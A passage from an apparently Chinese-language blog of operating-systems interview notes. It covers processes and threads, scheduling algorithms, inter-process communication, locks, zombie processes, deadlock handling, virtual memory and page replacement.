id="4-进程与线程的概念"><a href="#4-进程与线程的概念" class="headerlink" title="4 - 进程与线程的概念"></a>4 - 进程与线程的概念</h3><ul><li>进程：是系统进行资源调度和分配的基本单位，且每个进程拥有独立的地址空间，进程实现了操作系统的并发，是系统中并发执行的单位。</li><li>线程：是进程的子任务，是CPU调度和分派的基本单位，用于保证程序的实时性，实现进程内部的并发；</li></ul><h3 id="5-进程与线程的区别"><a href="#5-进程与线程的区别" class="headerlink" title="5 - 进程与线程的区别"></a>5 - 进程与线程的区别</h3><p>答案一：</p><ul><li><strong>单位：进程是资源分配的最小单位，线程是CPU调度的最小单位。</strong>两者均可并发执行。</li><li><strong>从属：一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。</strong>线程依赖于进程而存在。</li><li><strong>资源：进程之间的资源是独立的，进程在执行过程中拥有独立的内存单元，而多个线程共享进程的内存。</strong><ul><li>资源分配给进程，同一进程的所有线程共享该进程的所有资源。</li><li>同一进程中的多个线程共享代码段（代码和常量），数据段（全局变量和静态变量），扩展段（堆存储）。但是每个线程拥有自己的栈段，栈段又叫运行时段，用来存放所有局部变量和临时变量。</li></ul></li><li><strong>系统开销：在创建或撤销进程时，系统都要为之分配或回收资源，系统开销显著大于创建或撤销线程的开销。</strong><ul><li>在进行进程切换时，设计到整个当前进程CPU环境的保存以及新被调度运行的进程的CPU环境的设置。</li><li>而线程切换只需要保存和设置少量寄存器的内容，并不涉及存储管理方面的操作。</li><li>切换进程的开销也远大于切换线程的开销。</li><li>进程编程调试简单可靠性高，但是创建、销毁、切换开销大；线程正相反，但是编程调试相对复杂</li></ul></li><li><strong>进程之间不会相互影响，一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃会导致整个进程崩溃。</strong>所以多进程比多线程健壮。</li></ul><p>答案二：根本区别就是多进程每个进程有自己的地址空间，线程则是共享地址空间。</p><ul><li>速度：线程创建速度快，线程间通信快、切换快，因为它们在同一地址空间内</li><li>资源利用率：线程的资源利用率比较好也是因为它们在同一地址空间</li><li>同步问题：线程使用公共变量&#x2F;内存时需要使用同步机制，也是因为它们在同一地址空间内。</li></ul><h3 id="6-多线程与多进程的不同？"><a href="#6-多线程与多进程的不同？" class="headerlink" title="6 - 多线程与多进程的不同？"></a>6 - 多线程与多进程的不同？</h3><ul><li>进程是资源分配的最小单位，而线程时CPU 调度的最小单位。</li><li><strong>多线程之间共享同一个进程的地址空间</strong>，线程间通信简单，同步复杂，线程创建、销毁和切换简单，速度快，占用内存少，<strong>适用于多核分布式系统</strong>，但是线程间会相互影响，一个线程意外终止会导致同一个进程的其他线程也终止，程序可靠性弱。</li><li><strong>多进程间拥有各自独立的运行地址空间</strong>，进程间不会相互影响，程序可靠性强，但是进程创建、销毁和切换复杂，速度慢，占用内存多，进程间通信复杂，但是同步简单，<strong>适用于多核、多机分布。</strong></li></ul><h3 id="7-多线程与多进程的应用场景"><a href="#7-多线程与多进程的应用场景" class="headerlink" title="7 - 多线程与多进程的应用场景"></a>7 - 多线程与多进程的应用场景</h3><ul><li>需要频繁创建销毁的优先用线程；</li><li>需要进行大量计算的优先使用线程；</li><li>强相关的处理用线程，弱相关的处理用进程；</li><li>多线程模型主要优势为线程间切换代价较小，因此适用于I&#x2F;O 密集型的工作场景，因此I&#x2F;O密集型的工作场景经常会由于I&#x2F;O 阻塞导致频繁的切换线程。同时，<strong>多线程模型也适用于单机多核分布式场景。</strong></li><li>多进程模型，适用于CPU 密集型。同时，多进程模型也适用于多机分布式场景中，易于多机扩展。</li></ul><h3 id="8-进程的状态转换"><a href="#8-进程的状态转换" class="headerlink" title="8 - 进程的状态转换"></a>8 - 进程的状态转换</h3><p>进程包括三种状态：就绪、运行、阻塞</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210912191907237.png"></p><p><strong>就绪 –&gt;  运行：对就绪状态的进程，当进程调度程序按一种选定的策略从中选中一个就绪进程，为之分配处理机后，该进程便由就绪状态变为执行状态</strong></p><p><strong>运行 –&gt;  阻塞：正在执行的进程因发生某等待事件而无法运行，则进程由执行状态变为阻塞状态，</strong>如进程提出输入&#x2F;输出请求而变成带带外部设备传入信息的状态；进程申请资源（主存空间或外部设备）得不到满足时编程等待资源状态，进程运行中出现了故障（程序出错或主存储器读写错误等）编程等待干预状态等；</p><p><strong>阻塞 –&gt;  就绪：</strong>处于阻塞状态的进程，其等待的事件已经发生，如输入&#x2F;输出完成；资源得到满足；或错误处理完毕时，处于等待状态的进程并不马上转入运行状态，而是先转入就绪状态，再由系统进程调度程序在适当的时候将改进成转为执行状态。</p><p><strong>运行 –&gt;  就绪 ：</strong>正在执行的进程，因时间片用完而被暂停运行；或在采用抢占式优先级调度算法的系统中，当有更高优先级的进程要运行而被迫让出处理机时，该进程便从运行状态转变为就绪状态</p><h3 id="9-进程的调度算法有哪些？"><a href="#9-进程的调度算法有哪些？" class="headerlink" title="9 - 进程的调度算法有哪些？"></a>9 - 进程的调度算法有哪些？</h3><ul><li>先来先服务调度算法</li><li>时间片轮转调度算法</li><li>短作业优先调度算法</li><li>最短剩余时间优先调度算法：<ul><li>是针对最短进程优先增加了抢占机制的版本</li></ul></li><li>高响应比优先调度算法：<ul><li>主要用于作业调度，该算法是对 先来先服务调度算法 和 短作业优先调度算法 的一种综合平衡，同时考虑每个作业的等待时间和估计的运行时间</li></ul></li><li>优先级调度算法</li></ul><h3 id="10-进程间的通信方式有哪些？"><a href="#10-进程间的通信方式有哪些？" class="headerlink" title="10 - 进程间的通信方式有哪些？"></a>10 - 进程间的通信方式有哪些？</h3><ul><li>管道</li><li>系统IPC （消息队列、信号量、共享内存）</li><li>套接字socket</li></ul><h4 id="10-1-管道"><a href="#10-1-管道" class="headerlink" title="10.1 - 管道"></a>10.1 - 管道</h4><p>管道主要包括普通管道和命名管道：管道可用于具有亲缘关系的父子进程间的通信，有名管道除了具有管道所具有的功能外，它还允许无亲缘关系进程的通信。</p><p><strong>普通管道PIPE：</strong></p><ul><li>半双工（数据只能在一个方向上流动），具有固定的读端和写端</li><li>只能用于具有亲缘关系的进程间通信（也就是父子进程或兄弟进程之间）</li><li>它可以看成是一种特殊的文件，对于它的读写也可以使用普通的read、write等函数。但是它不是普通的文件，不属于其他任何文件系统，并且只存在于内存中。</li><li><code>int pipe(int fd[2]);</code>  当一个管道建立时，会创建两个文件文件描述符，要关闭管道只需将这两个文件描述符关闭即可。</li></ul><p><strong>命名管道FIFO：</strong></p><ul><li>可以在无关的进程之间交换数据</li><li>有路径名与之相关联，以一种特殊设备文件形式存在于文件系统中</li><li><code>int mkfifo(const char* pathname,mode_t mode);</code></li></ul><h4 id="10-2-系统IPC（Inter-Process-Communication）"><a href="#10-2-系统IPC（Inter-Process-Communication）" class="headerlink" title="10.2 - 系统IPC（Inter-Process Communication）"></a>10.2 - 系统IPC（Inter-Process Communication）</h4><p><strong>消息队列：</strong></p><ul><li>消息队列是消息的链表，存放在内核中。一个消息队列由一个标识符来标识（即队列ID）。</li><li>消息队列是面向记录的，其中的消息具有特定的格式以及特定的优先级；</li><li>消息队列独立于发送与接收进程。进程终止时，消息队列及其内容并不会被删除；</li><li>消息队列可以实现消息的随机查询。</li></ul><p><strong>信号量 semaphore：</strong></p><ul><li>信号量是一个计数器，信号量用于实现进程间的互斥与同步，而不是用于存储进程间通信数据；</li><li>信号量用于进程间同步，若要在进程间传递数据需要结合共享内存；</li><li>信号量基于操作系统的PV操作，程序对信号量的操作都是原子操作；</li><li>每次对信号量的PV操作不仅限于对信号量值+1或-1而是可以加减任意正整数；</li><li>支持信号量组。</li></ul><p><strong>共享内存 Shared Memory：</strong></p><ul><li>共享内存指两个或多个进程共享一块指定的存储区，不同进程可以即时看到对方进程中对共享内存中数据的更新；</li><li>因为多个进程可以同时操作，所以需要进行同步；</li><li><strong>信号量和共享内存通常结合在一起使用，信号量用来同步对共享内存的访问；</strong></li><li><strong>共享内存是最快的一种进程通信方式，因为进程是直接对内存进行存取。</strong></li></ul><h4 id="10-3-套接字-SOCKET"><a href="#10-3-套接字-SOCKET" class="headerlink" title="10.3 - 套接字 SOCKET"></a>10.3 - 套接字 SOCKET</h4><p>socket也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同主机之间的进程通信。</p><h3 id="11-线程通信方式"><a href="#11-线程通信方式" class="headerlink" title="11 - 线程通信方式"></a>11 - 线程通信方式</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul><li>信号：类似进程间的信号处理</li><li>锁机制：互斥锁、读写锁、自旋锁</li><li>条件变量：使用通知的方式解锁，与互斥锁配合使用</li><li>信号量：包括无名线程信号量和命名线程信号量</li></ul><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h4><ul><li>全局变量：需要有多个线程来访问一个全局变量时，通常会在这个全局变量上加volatile声明，防止编译器对此变量进行优化</li><li>Message消息机制：常用的Message通信的接口主要有两个：<ul><li>PostMessage 为线程向主窗口发消息</li><li>PostThreadMessage 是任意两个线程之间的通信接口</li></ul></li><li>CEvent：CEvent为MFC中的一个对象，可以通过对CEvent的触发状态进行改变，从而实现线程间的通信和同步，是实现线程直接同步的一种方法</li></ul><h3 id="12-线程同步的方式有哪些？"><a href="#12-线程同步的方式有哪些？" class="headerlink" title="12 - 线程同步的方式有哪些？"></a>12 - 线程同步的方式有哪些？</h3><p><strong>（1）临界区：</strong></p><p>通过多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问；</p><p><strong>（2）信号量：</strong></p><p>信号量是一种特殊的变量，可用于线程同步。它只取自然数值，并且只支持两种操作：</p><ul><li>P(V)：如果信号量大于 0 ，执行 -1 操作；若S减1后仍大于或等于0，则进程继续执行；若S减1后小于0，则该进程被阻塞后放入等待该信号量的等待队列中，然后转进程调度。</li><li>V(V)：V+1；若结果大于0，则进程继续执行；若相加后结果仍小于或等于0，则从该信号的等待队列中释放一个等待进程，然后再返回原进程继续执行或转进程调度。</li></ul><p>其系统调用为：</p><ul><li><code>sem_wait（sem_t *sem）：</code>以原子操作的方式将信号量<code>-1</code>，如果信号量值小于<code>0</code>，则<code>sem_wait</code>将被阻塞，直到这个信号量具有<code>非0 值</code>。</li><li><code>sem_post（sem_t *sem)：</code>以原子操作将信号量值<code>+1</code>。当信号量<code>大于0 </code>时，其他正在调用<code>sem_wait </code>等待信号量的线程将被唤醒。</li></ul><p><strong>（3）互斥量：</strong></p><p>互斥量又称互斥锁，主要用于线程互斥，不能保证按序访问，可以和条件锁一起实现同步。当进入临界区时，需要获得互斥锁并且加锁；当离开临界区时，需要对互斥锁解锁，以唤醒其他等待该互斥锁的线程。其主要的系统调用如下：</p><ul><li>**pthread_mutex_init: **初始化互斥锁</li><li><strong>pthread_mutex_destroy：</strong>销毁互斥锁</li><li><strong>pthread_mutex_lock：</strong>以原子操作的方式给一个互斥锁加锁，如果目标互斥锁已经被上锁，**pthread_mutex_lock **调用将阻塞，直到该互斥锁的占有者将其解锁。</li><li>**pthread_mutex_unlock: **以一个原子操作的方式给一个互斥锁解锁。</li></ul><p><strong>（4）事件(信号)，Wait&#x2F;Notify：</strong></p><p>通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作</p><p><strong>（5）条件变量：</strong></p><p>条件变量，又称条件锁，用于在线程之间同步共享数据的值。条件变量提供一种线程间通信机制：当某个共享数据达到某个值时，唤醒等待这个共享数据的一个&#x2F;多个线程。即，当某个共享变量等于某个值时，调用signal&#x2F;broadcast。此时操作共享变量时需要加锁。其主要的系统调用如下：</p><ul><li>**pthread_cond_init: **初始化条件变量</li><li><strong>pthread_cond_destroy：</strong>销毁条件变量</li><li><strong>pthread_cond_signal：</strong>唤醒一个等待目标条件变量的线程。哪个线程被唤醒取决于调度策略和优先级。</li><li><strong>pthread_cond_wait：</strong>等待目标条件变量。需要一个加锁的互斥锁确保操作的原子性。该函数中在进入<code>wait </code>状态前首先进行解锁，然后接收到信号后会再加锁，保证该线程对共享资源正确访问。</li></ul><h3 id="14-线程产生的原因？"><a href="#14-线程产生的原因？" class="headerlink" title="14 - 线程产生的原因？"></a>14 - 线程产生的原因？</h3><p>进程可以使多个程序能并发执行，以提高资源的利用率和系统的吞吐量；但是<strong>进程具有一些  缺点：</strong></p><ul><li>进程在同一时间只能干一件事。</li><li>进程在执行的过程中如果阻塞，整个进程就会挂起，即使进程中有些工作不依赖于等待的资源，仍然不会执行。</li></ul><p>因此，操作系统引入了比进程粒度更小的线程，作为并发执行的基本单位，从而减少程序在并发执行时所付出的时空开销，提高并发性。</p><p><strong>和进程相比，线程的优势如下：</strong></p><ul><li><strong>资源开销小：</strong>在linux 系统下，启动一个新的进程必须分配给它独立的地址空间，建立众多的数据表来维护它的代码段、堆栈段和数据段，这是一种”昂贵”的多任务工作方式。</li><li>由于多个线程共享同一个进程虚拟空间，线程之间通信更加方便，切换效率更快，比进程更具有更高的性能。</li></ul><p><strong>除以上优点外，多线程程序作为一种多任务、并发的工作方式，还有如下优点：</strong></p><ul><li>使多CPU 系统更加有效。操作系统会保证当线程数不大于CPU 数目时，不同的线程运行于不同的CPU 上。</li><li>改善程序结构。一个既长又复杂的进程可以考虑分为多个线程，成为几个独立或半独立的运行部分，这样的程序才会利于理解和修改</li></ul><h3 id="15-线程切换时需要保存哪些上下文？SP、PC、EAX-这些寄存器的作用？"><a href="#15-线程切换时需要保存哪些上下文？SP、PC、EAX-这些寄存器的作用？" class="headerlink" title="15 - 线程切换时需要保存哪些上下文？SP、PC、EAX 这些寄存器的作用？"></a>15 - 线程切换时需要保存哪些上下文？SP、PC、EAX 这些寄存器的作用？</h3><p>线程在切换的过程中需要保存：</p><ul><li>当前线程Id</li><li>线程状态</li><li>堆栈</li><li>寄存器状态</li></ul><p>其中<strong>寄存器主要包括SP PC EAX 等寄存器</strong>，其主要功能如下：</p><ul><li><strong>SP: 堆栈指针</strong>，指向当前栈的栈顶地址</li><li><strong>PC: 程序计数器</strong>，存储下一条将要执行的指令</li><li><strong>EAX: 累加寄存器</strong>，用于加法乘法的缺省寄存器</li></ul><h3 id="16-单核机器上写多线程程序，是否需要考虑加锁，为什么？"><a href="#16-单核机器上写多线程程序，是否需要考虑加锁，为什么？" class="headerlink" title="16 - 单核机器上写多线程程序，是否需要考虑加锁，为什么？"></a>16 - 单核机器上写多线程程序，是否需要考虑加锁，为什么？</h3><p>在单核机器上写多线程程序，仍然<strong>需要线程锁</strong>。因为线程锁通常用来实现线程的同步和通信。在单核机器上的多线程程序，仍然存在线程同步的问题。因为在抢占式操作系统中，通常为每个线程分配一个时间片，当某个线程时间片耗尽时，操作系统会将其起，然后运行另一个线程。如果这两个线程共享某些数据，不使用线程锁的前提下，可能会导致共享数据修改引起冲突。</p><h3 id="17-游戏服务器应该为每个用户开辟一个线程还是一个进程？"><a href="#17-游戏服务器应该为每个用户开辟一个线程还是一个进程？" class="headerlink" title="17 - 游戏服务器应该为每个用户开辟一个线程还是一个进程？"></a>17 - 游戏服务器应该为每个用户开辟一个线程还是一个进程？</h3><ul><li>游戏服务器应该为每个用户开辟一个进程。因为同一进程间的线程会相互影响，一个线程死掉会影响其他线程，从而导致进程崩溃。因此为了保证不同用户之间不会相互影响，应该为每个用户开辟一个进程</li></ul><h3 id="18-互斥锁（mutex）机制，互斥锁和读写锁的区别？"><a href="#18-互斥锁（mutex）机制，互斥锁和读写锁的区别？" class="headerlink" title="18 - 互斥锁（mutex）机制，互斥锁和读写锁的区别？"></a>18 - 互斥锁（mutex）机制，互斥锁和读写锁的区别？</h3><ul><li><p><strong>互斥锁 mutex：</strong>用于保证在任何时刻，都只能有一个线程访问该对象。当获取锁操作失败时，线程会进入睡眠，等待锁释放时被唤醒。</p></li><li><p><strong>读写锁 rwlock：</strong>分为读锁和写锁。处于读操作时，可以允许多个线程同时获得读操作。但是同一时刻只能有一个线程可以获得写锁。其它获取写锁失败的线程都会进入睡眠状态，直到写锁释放时被唤醒。<strong>注意：写锁会阻塞其它读写锁。当有一个线程获得写锁在写时，读锁也不能被其它线程获取；写者优先于读者</strong>（一旦有写者，则后续读者必须等待，唤醒时优先考虑写者）。适用于读取数据的频率远远大于写数据的频率的场合。</p></li></ul><p><strong>互斥锁和读写锁的区别：</strong></p><ul><li>读写锁区分读者和写者，而互斥锁不区分</li><li>互斥锁同一时间只允许一个线程访问该对象，无论读写；读写锁同一时间内只允许一个写者，但是允许多个读者同时读对象。</li></ul><h3 id="19-介绍几种典型的锁？"><a href="#19-介绍几种典型的锁？" class="headerlink" title="19 - 介绍几种典型的锁？"></a>19 - 介绍几种典型的锁？</h3><h4 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h4><ul><li>多个读者可以同时进行读</li><li>写者必须互斥（只允许一个写者写，写时不能读，后续读者必须等待，唤醒时优先考虑写者）</li></ul><h4 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h4><p><strong>互斥锁用于控制多个线程对他们之间共享资源互斥访问的一个信号量。</strong>也就是说是为了避免多个线程在某一时刻同时操作一个共享资源。</p><ul><li>一次只能一个线程拥有互斥锁，其他线程只能等待</li><li>互斥锁是在抢锁失败的情况下主动放弃CPU进入睡眠状态直到锁的状态改变时再唤醒，而操作系统负责线程调度，为了实现锁的状态发生改变时唤醒阻塞的线程或进程，需要把锁交给操作系统管理，所以互斥锁在加锁操作时设计上下文的切换。</li><li>互斥锁的实际效率还是可以接受的，加锁时间大概100ns左右，而实际互斥锁的一种可能的实现锁先自旋一段时间，当自旋的时间超过阈值之后再将线程投入到睡眠中，因此在并发运算中使用互斥锁（每次占用锁的时间很短）的效果不亚于使用自旋锁</li></ul><h4 id="条件锁"><a href="#条件锁" class="headerlink" title="条件锁"></a>条件锁</h4><p>条件锁就是所谓的条件变量，<strong>某一个线程因为某个条件为满足时可以使用条件变量使该程序处于阻塞状态。</strong>一旦条件满足以“信号量”的方式唤醒一个因为该条件而被阻塞的线程。最为常见就是在线程池中，起初没有任务时任务队列为空，此时线程池中的线程因为“任务队列为空”这个条件处于阻塞状态。一旦有任务进来，就会以信号量的方式唤醒一个线程来处理这个任务。</p><ul><li>互斥锁一个明显的缺点锁它只有两种状态：锁定和非锁定。而条件变量通过允许线程阻塞和等待另一个线程发送信号的方法弥补了互斥锁的不足，他常和互斥锁一起使用，以免出现</li></ul><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><p><strong>如果线程无法取得锁，并不会立刻放弃CPU时间片，而是一直循环尝试获取锁，直到获取为止。</strong>如果别的线程长时间占有锁，那么自旋就是在浪费CPU做无用功，但是自旋锁一般应用于加锁时间很短的场景，这时效率锁比较高的。</p><h3 id="20-进程终止的方式"><a href="#20-进程终止的方式" class="headerlink" title="20 - 进程终止的方式"></a>20 - 进程终止的方式</h3><ul><li>正常退出：自愿</li><li>错误退出：自愿</li><li>严重错误：非自愿</li><li>被其他进程杀死：非自愿 kill</li></ul><h3 id="21-守护进程、僵尸进程、孤儿进程都是什么？"><a href="#21-守护进程、僵尸进程、孤儿进程都是什么？" class="headerlink" title="21 - 守护进程、僵尸进程、孤儿进程都是什么？"></a>21 - 守护进程、僵尸进程、孤儿进程都是什么？</h3><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>指在后台运行的，没有控制终端与之相连的进程。它独立于控制终端，周期性地执行某种任务。Linux的大多数服务器就是用守护进程的方式实现的，如Web服务器进程HTTP等</p><h4 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h4><p>如果父进程先退出，子进程还没退出，那么子进程的父进程将变为init进程。（注：任意一个进程都必须有父进程）</p><p>一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。孤儿进程将被init进程（pid &#x3D; 1）所收养，并由init进程对它们完成状态进行收集工作。</p><h4 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h4><p>如果子进程先退出，父进程还没有退出，那么子进程必须等到父进程捕获到了子进程的退出状态才真正结束，否则这个时候子进程就成了僵尸进程。</p><p>设置僵尸进程的目的是维护子进程的信息，以便父进程在以后某个时候获取。这些信息至少包括进程ID，进程的终止状态，以及该进程使用CPU的时间，所以当终止子进程的父进程调用wait或waitpid时就可以得到这些信息。</p><p>如果一个进程终止，而该进程有子进程处于僵尸状态，那么它的所有僵尸子进程的父进程ID将被置为1（init进程）。接管这些子进程的init进程将清理它们（也就是说init进程将wait它们，从而去除它们的僵尸状态）。</p><h3 id="22-如何避免僵尸进程？"><a href="#22-如何避免僵尸进程？" class="headerlink" title="22 - 如何避免僵尸进程？"></a>22 - 如何避免僵尸进程？</h3><ul><li><strong>通过 <code>signal (SIGCHLD, SIG_IGN )</code> 通知内核对子进程的结束不关心，由内核回收。如果不想让父进程挂起，可以再父进程中加入一条语句： <code>signal (SIGCHLD, SIG_IGN )</code> ;表示父进程忽略 SIGCHLD信号，该信号是子进程退出的时候向父进程发送的。</strong></li><li>父进程调用 wait &#x2F; waitpid 等函数等待子进程结束，如果尚无子进程退出 wait 会导致父进程阻塞。waitpid可以通过传递 WNOHANG使父进程不阻塞立即返回。</li></ul><hr><h3 id="23-什么是死锁？"><a href="#23-什么是死锁？" class="headerlink" title="23 - 什么是死锁？"></a>23 - 什么是死锁？</h3><p>由于系统中存在一些不可剥夺资源，当两个或两个以上进程在执行过程中，因争夺资源而造成的相互等待，使每个进程都无法向前推进的现象，即死锁</p><h3 id="24-产生死锁的原因？"><a href="#24-产生死锁的原因？" class="headerlink" title="24 - 产生死锁的原因？"></a>24 - 产生死锁的原因？</h3><ul><li>竞争资源<ul><li>例如：系统中只有一台打印机，可供进程A使用，假定A已占用打印机，而B继续要求打印机打印则会被阻塞</li><li>系统资源可分两类<ul><li>可剥夺资源：CPU、主存等</li><li>不可剥夺资源：磁带机、打印机等</li></ul></li></ul></li><li>进程推进顺序不当<ul><li>例如：进程A和进程B相互等待对方的数据</li></ul></li></ul><h3 id="25-死锁发生的条件有哪些？"><a href="#25-死锁发生的条件有哪些？" class="headerlink" title="25 - 死锁发生的条件有哪些？"></a>25 - 死锁发生的条件有哪些？</h3><p>死锁发生的四个必要条件如下：</p><ul><li><strong>互斥条件：</strong>进程对所分配到的资源不允许其他进程访问，若其他进程访问该资源，只能等待，直至占有该资源的进程使用完成后释放该资源；</li><li><strong>请求和保持条件：</strong>进程获得一定的资源后，又对其他资源发出请求，但是该资源可能被其他进程占有，此时请求阻塞，但该进程不会释放自己已经占有的资源；</li><li><strong>不可剥夺条件：</strong>进程已获得的资源，在未完成使用之前，不可被剥夺，只能在使用后自己释放;</li><li><strong>环路等待条件：</strong>进程发生死锁后，必然存在一个进程-资源之间的环形链。</li></ul><h3 id="26-如何解决死锁？"><a href="#26-如何解决死锁？" class="headerlink" title="26 - 如何解决死锁？"></a>26 - 如何解决死锁？</h3><ul><li>预防死锁：破坏四个必要条件中的一个或多个来预防死锁</li><li>避免死锁：在资源动态分配的过程中，用某种方式防止系统进入不安全的状态</li><li>检测死锁：运行时产生死锁，及时发现死锁，将程序解脱出来</li><li>解除死锁：发生死锁后，撤销进程，回收资源，分配给正在阻塞状态的进程。</li></ul><h3 id="27-如何预防死锁？"><a href="#27-如何预防死锁？" class="headerlink" title="27 - 如何预防死锁？"></a>27 - 如何预防死锁？</h3><ul><li><strong>破坏 请求和保持条件：</strong><ul><li>一次性分配所有资源，这样就不会再有请求了</li><li>只要有一个资源得不到分配，就不给这个进程分配其他资源</li></ul></li><li><strong>破坏 不可剥夺资源：</strong><ul><li><strong>当进程新的资源未得到满足时，释放已占有的资源</strong>，从而破坏不可剥夺的条件</li></ul></li><li><strong>破坏 环路等待条件：</strong><ul><li><strong>资源有序分配法：</strong>系统给每类资源赋予一个序号，每个进程按编号递增的请求资源，释放则相反，从而破坏环路等待的条件</li></ul></li></ul><h3 id="28-如何避免死锁？"><a href="#28-如何避免死锁？" class="headerlink" title="28 - 如何避免死锁？"></a>28 - 如何避免死锁？</h3><p>安全状态：如果死锁没有发生，并且及时所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则成该状态是安全的。</p><p>使用<strong>银行家算法</strong>检测系统是否处于安全状态，如果每次资源的分配回导致系统进入不安全状态，则不进行分配。</p><h3 id="29-如何解除死锁？"><a href="#29-如何解除死锁？" class="headerlink" title="29 - 如何解除死锁？"></a>29 - 如何解除死锁？</h3><p>资源剥夺：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他死锁进程</p><p>撤销进程：强制撤销部分、甚至全部死锁进程并剥夺这些进程的资源（撤销的原则可以按照进程优先级和撤销进程代价的高低进行）</p><p>进程回退：让一个或多个进程回退到足以避免死锁的地步。进程回退时自愿释放资源而不是被剥夺。要求系统保持进程的历史信息，设置还原点。</p><h3 id="30-物理地址、逻辑地址、虚拟内存的概念？"><a href="#30-物理地址、逻辑地址、虚拟内存的概念？" class="headerlink" title="30 - 物理地址、逻辑地址、虚拟内存的概念？"></a>30 - 物理地址、逻辑地址、虚拟内存的概念？</h3><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>它是地址转换的最终地址，进程在运行时执行指令和访问数据最后都要通过物理地址从主存中存取，是内存单元的真正地址</p><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>是指用户看到的地址。逻辑地址并不一定是元素存储的真实地址，即数组元素的物理地址（在内存条中的所处的位置）并非是连续的，只是通过操作系统通过地址映射，将逻辑地址映射成连续的，这样使用更符合人们的直观思维</p><h4 id="虚拟内存："><a href="#虚拟内存：" class="headerlink" title="虚拟内存："></a>虚拟内存：</h4><p>虚拟内存是一种内存管理技术，它会使程序自己认为自己拥有一块很大且连续的内存，然而，这个程序在内存中不是连续的，并且有些还会在磁盘上，在需要时进行数据交换。</p><h3 id="31-分页和分段的区别？"><a href="#31-分页和分段的区别？" class="headerlink" title="31 - 分页和分段的区别？"></a>31 - 分页和分段的区别？</h3><ol><li>段是信息的逻辑单位，它是根据用户的需要划分的，因此段是对用户可见的；页是信息的物理单位，是为了管理主存的方便而划分的，对用户是透明的；</li><li>段的大小不固定，有它所完成的功能决定；页的大小固定，由系统决定</li><li>段向用户提供二维地址空间；页向用户提供的是一维地址空间</li><li>段是信息的逻辑单位，便于存储保护和信息共享，页的保护和共享收到限制</li></ol><h3 id="32-说一说虚拟地址空间的好处和坏处？"><a href="#32-说一说虚拟地址空间的好处和坏处？" class="headerlink" title="32 - 说一说虚拟地址空间的好处和坏处？"></a>32 - 说一说虚拟地址空间的好处和坏处？</h3><p>​  虚拟内存技术使得不同进程在运行过程中，它所看到的是自己独自占有了当前系统的4G 内存。所有进程共享同一物理内存，每个进程只把自己目前需要的虚拟内存空间映射并存储到物理内存上。事实上，在每个进程创建加载时，内核只是为进程“创建”了虚拟内存的布局，具体就是初始化进程控制表中内存相关的链表，实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text .data 段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的映射就好（叫做存储器映射），等到运行到对应的程序时，才会通过缺页异常，来拷贝数据。还有进程运行过程中，要动态分配内存，比如malloc 时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。</p><h4 id="虚拟内存的好处"><a href="#虚拟内存的好处" class="headerlink" title="虚拟内存的好处"></a>虚拟内存的好处</h4><ul><li>扩大地址空间；</li><li>内存保护：每个进程运行在各自的虚拟内存地址空间，互相不能干扰对方。虚存还对特定的内存地址提供写保护，可以防止代码或数据被恶意篡改。</li><li>公平内存分配。采用了虚存之后，每个进程都相当于有同样大小的虚存空间。</li><li>当进程通信时，可采用虚存共享的方式实现。</li><li>当不同的进程使用同样的代码时，比如库文件中的代码，物理内存中可以只存储一份这样的代码，不同的进程只需要把自己的虚拟内存映射过去就可以了，节省内</li><li>虚拟内存很适合在多道程序设计系统中使用，许多程序的片段同时保存在内存中。当一个程序等待它的一部分读入内存时，可以把CPU 交给另一个进程使用。在内存中可以保留多个进程，系统并发度提高</li><li>在程序需要分配连续的内存空间的时候，只需要在虚拟内存空间分配连续空间，而不需要实际物理内存的连续空间，可以利用碎片</li></ul><h4 id="虚拟内存的代价："><a href="#虚拟内存的代价：" class="headerlink" title="虚拟内存的代价："></a>虚拟内存的代价：</h4><ul><li>虚存的管理需要建立很多数据结构，这些数据结构要占用额外的内存</li><li>虚拟地址到物理地址的转换，增加了指令的执行时间。</li><li>页面的换入换出需要磁盘I&#x2F;O，这是很耗时的</li><li>如果一页中只有一部分数据，会浪费内存。</li></ul><h3 id="33-置换算法有哪些？"><a href="#33-置换算法有哪些？" class="headerlink" title="33 - 置换算法有哪些？"></a>33 - 置换算法有哪些？</h3><p>当访问一个内存中不存在的页，并且内存已满，则需要从内存中调出一个页或将数据送至磁盘对换区，替换一个页，这种现象叫做缺页置换。当前操作系统最常采用的缺页置换算法如下：</p><ul><li><strong>最佳置换(OPT)算法</strong>：从主存中移出永远不再需要的页面；如无这样的页面存在，则选择最长时间不需要访问的页面。</li><li><strong>先进先出(FIFO)算法：置换最先调入内存的页面</strong>，即置换在内存中驻留时间最久的页面。按照进入内存的先后次序排列成队列，从队尾进入，从队首删除。</li><li><strong>最近最少使用（LRU）算法: 置换最近一段时间以来最长时间未访问过的页面。</strong>根据程序局部性原理，刚被访问的页面，可能马上又要被访问；而较长时间内没有被访问的页面，可能最近不会被访问。</li><li><strong>时钟（CLOCK）置换算法</strong></li></ul><p><strong>当前最常采用的就是LRU 算法。</strong></p><h3 id="34-缺页中断是什么？"><a 